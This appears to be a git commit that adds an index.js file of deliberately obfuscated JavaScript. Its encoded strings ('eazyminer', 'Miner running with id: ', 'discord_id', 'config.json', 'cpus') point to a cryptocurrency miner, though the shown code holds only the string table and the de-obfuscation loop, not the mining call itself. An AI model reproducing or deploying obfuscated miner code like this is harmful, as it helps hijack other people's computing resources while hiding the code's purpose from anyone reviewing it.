92a12caf3fe924f4f7990b651bfc59909bfc8dae
play452 <oscarlin@edu.schools.us.kg>
2024-09-01 19:25:24 -0400

    Create index.js

---
+++ index.js
@@ -0,0 +1,60 @@
+const w = A;
+function D() {
+    const a = [
+        "154AGlAim",
+        "1542732lqMxOD",
+        "discord_id",
+        "48TUbOmI",
+        "6PMzgaw",
+        "5869480jPgyHs",
+        "113106etkGaX",
+        "length",
+        "readFileSync",
+        "82627vldRRF",
+        "Miner\x20running\x20with\x20id:\x20",
+        "8626743nNtHkq",
+        "250nIpIyX",
+        "utf8",
+        "325865TaGrWP",
+        "config.json",
+        "eazyminer",
+        "1114927xGBmoC",
+        "cpus",
+        "parse",
+    ];
+    D = function () {
+        return a;
+    };
+    return D();
+}
+function A(g, Q) {
+    const d = D();
+    return (
+        (A = function (l, T) {
+            l = l - 0xb0;
+            let z = d[l];
+            return z;
+        }),
+        A(g, Q)
+    );
+}
+(function (g, Q) {
+    const z = A,
+        d = g();
+    while (!![]) {
+        try {
+            const l =
+                (-parseInt(z(0xc0)) / 0x1) * (-parseInt(z(0xbb)) / 0x2) +
+                -parseInt(z(0xb7)) / 0x3 +
+                (-parseInt(z(0xb9)) / 0x4) * (parseInt(z(0xb0)) / 0x5) +
+                (-parseInt(z(0xbd)) / 0x6) * (parseInt(z(0xb6)) / 0x7) +
+                parseInt(z(0xbc)) / 0x8 +
+                -parseInt(z(0xc2)) / 0x9 +
+                (-parseInt(z(0xc3)) / 0xa) * (-parseInt(z(0xb3)) / 0xb);
+            if (l === Q) break;
+            else d["push"](d["shift"]());
+        } catch (T) {
+            d["push"](d["shift"]());
+        }
+    }
+})(D, 0xce862);
